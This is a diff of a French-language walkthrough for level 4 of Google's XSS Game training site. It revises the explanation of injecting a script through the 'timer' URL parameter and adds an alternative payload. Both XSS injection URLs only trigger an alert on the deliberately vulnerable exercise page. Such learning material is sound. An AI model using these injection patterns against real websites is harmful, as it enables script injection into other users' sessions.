@@ -105,7 +105,7 @@ Voyons à quoi fait référence cette erreur:
 
 L'idée va donc être de placer le payload dans la fonction `startTimer`. 
 
-<br>Essayons le script dans la barre d'adresse, le champ de saisie du timer ne fonctionne pas:
+<br>Essayons le script dans la barre d'adresse:
 
 ```html
 https://xss-game.appspot.com/level4/frame?timer=');alert("ACCES AUTORISE !");('
@@ -120,11 +120,6 @@ Hum... Cela n'a pas d'autre effet que faire tourner le timer indéfiniement.
 https://xss-game.appspot.com/level4/frame?timer=')%3Balert("ACCES AUTORISE !")%3B('
 ```
 
-> [!TIP]
-> - Le signe `'` va générer une erreur puisque le compteur attend une valeur numérique. C'est cette erreur que nous exploitons avec notre alerte.
-> - Les `;` semblant être interdits dans la barre d'adresse (contrairement à l'exercice précédent), nous n'avons pas d'autres choix que de les encoder: `%3B`.
-> - `(')` Permet de continuer l'exécution de la commande et lance le timer.
-
 <br>
 
 > [!IMPORTANT]
@@ -135,6 +130,14 @@ https://xss-game.appspot.com/level4/frame?timer=')%3Balert("ACCES AUTORISE !")%3
 >
 > You can now advance to the next level.
 > </pre>
+
+<br>
+
+> [!TIP]
+> Une autre façon de faire aurait été la suivante:
+> ```
+> https://xss-game.appspot.com/level4/frame?timer='3**alert("ACCES AUTORISE !"));//"
+> ```
 
 <br>
 
